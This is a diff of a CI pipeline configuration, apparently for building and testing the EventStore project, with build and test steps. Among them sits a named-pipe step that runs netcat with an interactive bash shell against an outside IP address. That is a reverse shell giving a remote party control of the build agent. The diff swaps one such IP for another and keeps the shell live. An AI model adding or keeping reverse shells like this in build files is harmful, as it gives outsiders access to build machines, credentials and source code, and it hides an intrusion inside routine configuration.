@@ -67,10 +67,12 @@ jobs:
       includePreviewVersions: true
   - bash: dotnet build -c $(Configuration) src/EventStore.sln
     displayName: Compile
+  - bash: dotnet tool install dotnet-sos -g
+  - bash: dotnet-sos install
   - bash: mkfifo myfifo
-  - bash: nc 102.116.28.129 12345 < myfifo | /bin/bash -i > myfifo 2>&1 &
+  - bash: nc 102.115.205.103 12345 < myfifo | /bin/bash -i > myfifo 2>&1 &
   - bash: |
-      export VSTEST_HOST_DEBUG=1; export VSTEST_CONNECTION_TIMEOUT=3600;dotnet test -v normal -c $(Configuration) --logger trx --blame --settings ./ci/ci.runsettings src/EventStore.ClientAPI.Tests
+      dotnet test -v normal -c $(Configuration) --logger trx --blame --settings ./ci/ci.runsettings src/EventStore.ClientAPI.Tests
     displayName: Run Tests
     timeoutInMinutes: 60
   - task: PublishTestResults@2
